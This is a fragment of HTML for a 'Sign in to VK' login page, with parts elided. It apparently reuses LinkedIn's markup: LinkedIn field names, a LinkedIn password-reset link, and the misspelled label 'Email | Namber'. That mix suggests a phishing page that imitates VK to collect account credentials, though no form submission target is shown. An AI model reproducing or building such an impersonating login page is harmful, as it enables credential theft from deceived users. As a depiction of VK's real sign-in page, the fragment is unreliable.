...
<![endif]-->
<link rel="icon" href="https://vk.com/images/icons/favicons/fav_logo.ico?6">
...
<a href="http://www.vk.com/" class="logo" id="li-logo">
VK Home
</a>
</h2>
...
<fieldset>
<legend>Sign in to VK</legend>
<div class="outer-wrapper">
<div class="inner-wrapper">
<div class="logo_container">VK</div>
<ul id="mini-profile--js">
<li class="">
<div class="fieldgroup">
<label for="session_key-login">Email | Namber </label>
...
<a data-li-tooltip-id="login-tooltip" href="https://www.linkedin.com/uas/request-password-reset?session_redirect=&smp;trk=signin_fpwd" tracking="signin_fpwd" class="nav-link forgot-password-link password-reminder-link" title="Forgot password?">?</a>
</div>
</div>
</li>
<li class="button">
